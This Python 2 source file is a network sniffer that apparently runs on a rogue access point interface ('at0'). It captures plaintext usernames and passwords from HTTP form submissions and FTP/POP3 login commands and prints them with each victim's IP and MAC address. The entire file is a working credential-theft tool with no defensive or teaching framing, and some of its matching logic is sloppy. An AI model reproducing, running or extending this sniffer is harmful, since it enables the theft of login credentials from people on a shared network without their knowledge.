#!/usr/bin/env python
import dpkt
import pcap
import re
import socket
import urlparse
import binascii
import signal
import sys
from pprint import pprint

def add_colons_to_mac(mac_addr):
    s = list()
    for i in range(12/2):
        s.append(mac_addr[i*2:i*2+2])
    mac_with_colons = ":".join(s)
    return mac_with_colons


APP = {80: 'HTTP', 23: 'TELNET', 21: 'FTP', 110: 'POP3'}


class Sniffer(object):
    def __init__(self, *args, **kwargs):

        pattern = 'tcp and dst port 80 or dst port 21'
        # pattern = 'tcp and dst port 80 or dst port 21 or dst port 110'

        self.pc = pcap.pcap(kwargs['interface'])
        self.pc.setfilter(pattern)

        self.all_user_info = {}

        self.devices_mac = {}
        self.info_counter = 0

    def _is_host(self, content):
        regex = re.compile('Host: (.*)')
        return content is not None and regex.search(content)

    def _is_pwd(self, content):
        regex = re.compile('(.*)[password]=(.*)')
        return content is not None and regex.search(content)

    def _is_pwd_with_txt(self, content):
        regex = re.compile('(.*)[txtPwd]=(.*)')
        return content is not None and regex.search(content)

    def _pick_ftp_info(self, data, client, server, dport, eth_src):
        self.devices_mac.setdefault(add_colons_to_mac(eth_src), {})

        self.devices_mac[add_colons_to_mac(eth_src)]['client'] = client
        self.devices_mac[add_colons_to_mac(eth_src)]['server'] = server
        self.devices_mac[add_colons_to_mac(eth_src)]['app'] = APP.get(dport)
        self.devices_mac[add_colons_to_mac(eth_src)]['mac'] = (
            add_colons_to_mac(eth_src))

        if data.get('USER'):
            self.devices_mac[add_colons_to_mac(eth_src)].update(
                {'login': data.get('USER')})
        if data.get('PASS'):
            self.devices_mac[add_colons_to_mac(eth_src)].update(
                {'password': data.get('PASS')})

        device_info = self.devices_mac[add_colons_to_mac(eth_src)]

        if 'login' and 'password' in device_info.keys():
            print "FTP New Password get:"
            pprint(self.devices_mac[add_colons_to_mac(eth_src)])

            del self.devices_mac[add_colons_to_mac(eth_src)]

    def _pick_http_info(self, data, client, server, dport, eth_src):
        self.info_counter += 1
        self.all_user_info[self.info_counter] = (
            {'client': client, 'server': server,
             'app': APP.get(dport),
             'mac': add_colons_to_mac(binascii.hexlify(eth_src))}
        )

        for login_field in ['account', 'username', 'identification', 'id', 'login_id', 'os_username',
                            'txtAccount', 'u_name', 'email', 'mail', 'userName', 'member.email']:
            login_data = data.get(login_field)
            if login_data:
                self.all_user_info[self.info_counter].update(
                    {'login': login_data[0]})
                break
            else:
                self.all_user_info[self.info_counter].update({'login': None})

        for passwd_field in ['password', 'os_password', 'passwd', 'txtPwd', 'u_passwd', 'u_password', 'userPass', 'member.userPwd']:
            passwd_data = data.get(passwd_field)
            if passwd_data:
                self.all_user_info[self.info_counter].update(
                    {'password': passwd_data[0]})
                break
            else:
                self.all_user_info[self.info_counter].update({'password': None})

        print "HTTP New Password get:"
        pprint(self.all_user_info[self.info_counter])

    def _get_ftp_pop_payload(self, eth_pkt, ip_pkt, tcp_pkt):
        if 'USER' in tcp_pkt.data:
            regex = re.compile('USER (.*)')
            user_obj = regex.search(tcp_pkt.data)

            user_d = {'USER': user_obj.group(1).rstrip('\r')}
            self._pick_ftp_info(user_d, socket.inet_ntoa(ip_pkt.src),
                                socket.inet_ntoa(ip_pkt.dst), tcp_pkt.dport,
                                binascii.hexlify(eth_pkt.src))
        elif 'PASS' in tcp_pkt.data:
            regex = re.compile('PASS (.*)')
            password_obj = regex.search(tcp_pkt.data)

            password_d = {'PASS': password_obj.group(1).rstrip('\r')}
            self._pick_ftp_info(password_d, socket.inet_ntoa(ip_pkt.src),
                                socket.inet_ntoa(ip_pkt.dst), tcp_pkt.dport,
                                binascii.hexlify(eth_pkt.src))
        elif 'user' in tcp_pkt.data:
            regex = re.compile('user (.*)')
            user_obj = regex.search(tcp_pkt.data)

            user_d = {'USER': user_obj.group(1).rstrip('\r')}
            self._pick_ftp_info(user_d, socket.inet_ntoa(ip_pkt.src),
                                socket.inet_ntoa(ip_pkt.dst), tcp_pkt.dport,
                                binascii.hexlify(eth_pkt.src))
        elif 'pass' in tcp_pkt.data:
            regex = re.compile('pass (.*)')
            password_obj = regex.search(tcp_pkt.data)

            password_d = {'PASS': password_obj.group(1).rstrip('\r')}
            self._pick_ftp_info(password_d, socket.inet_ntoa(ip_pkt.src),
                                socket.inet_ntoa(ip_pkt.dst), tcp_pkt.dport,
                                binascii.hexlify(eth_pkt.src))
        else:
            return

    def _get_http_payload(self, eth_pkt, ip_pkt, tcp_pkt):
        try:
            http_req = dpkt.http.Request(tcp_pkt.data)
            if http_req.method == 'POST':
                print "This is POST method"
                pass
        except dpkt.dpkt.UnpackError:
            pass

        for data_field in ['mail', 'passw', 'password', 'os_password', 'passwd',
                            'txtPwd', 'u_passwd', 'u_password', 'userPass', 'member.userPwd']:
            if data_field in tcp_pkt.data:
                print "found data field by: %s" %data_field
                if 'POST' in tcp_pkt.data:
                    print "POST data"
                    pwd_obj = self._is_pwd(tcp_pkt.data)
                    if pwd_obj:
                        qs_d = urlparse.parse_qs(pwd_obj.group(0))
                        if not qs_d:
                            qs_d = urlparse.parse_qs(tcp_pkt.data)
                else:
                    print "not post data"
                    qs_d = urlparse.parse_qs(tcp_pkt.data)
            else:
                continue

            if qs_d:
                print "qs_d found %s in %s" % (qs_d, tcp_pkt.data)
                break

        if qs_d:
            self._pick_http_info(qs_d, socket.inet_ntoa(ip_pkt.src),
                                 socket.inet_ntoa(ip_pkt.dst),
                                 tcp_pkt.dport, eth_pkt.src)
        else:
            return

    def loop(self):
        while True:
            try:
                for ts, buf in self.pc:
                    eth = dpkt.ethernet.Ethernet(buf)
                    ip = eth.data
                    tcp = ip.data
                    if len(tcp.data) > 0:
                        # print 'Packet in dst port number', tcp.dport
                        # make sure the pattern is correct
                        if tcp.dport == 80:
                            self._get_http_payload(eth, ip, tcp)
                        elif tcp.dport == 21 or tcp.dport == 110:
                            self._get_ftp_pop_payload(eth, ip, tcp)
                        else:
                            pass

            except KeyboardInterrupt:
                #nrecv, ndrop, nifdrop = self.pc.stats()
                #print '\n%d packets received by filter' % nrecv
                #print '%d packets dropped by kernel' % ndrop
                break
            except (NameError, TypeError):
                # print "No packet"
                continue

    def __del__(self):
        # Status update
        pass


if __name__ == "__main__":
    s = Sniffer(interface='at0')
    print '%s is listening on' % s.pc.name
    s.loop()
